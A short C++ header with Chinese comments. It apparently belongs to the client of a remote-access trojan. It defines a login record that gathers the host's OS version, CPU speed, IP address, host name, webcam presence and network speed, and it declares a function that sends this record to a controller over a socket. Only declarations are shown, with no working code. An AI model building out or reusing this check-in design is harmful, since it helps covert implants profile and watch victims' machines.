#pragma once

#include <WinSock2.h>
#include "ClientSocket.h"
#include "Common.h"

#pragma comment(lib,"ws2_32.lib")
typedef struct
{	
	BYTE			bToken;			// = 1    //登陆信息
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;


//登陆请求
int SendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed);

//获得主机的名称
UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize);

DWORD CPUClockMhz();
bool IsWebCam();